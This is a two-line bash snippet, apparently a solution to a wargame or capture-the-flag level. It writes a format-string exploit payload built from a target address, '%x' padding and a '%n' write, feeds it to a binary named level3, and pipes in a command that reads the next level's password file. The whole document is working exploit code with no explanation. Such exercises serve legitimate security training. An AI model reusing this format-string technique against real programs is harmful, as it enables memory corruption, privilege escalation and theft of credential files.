```bash
python -c "print('\x8c\x98\x04\x08' + '%x'*3 + 'A'*41 +  '%n')" > /tmp/input3
(cat /tmp/input3; echo "cat /home/user/level4/.pass") | ./level3
```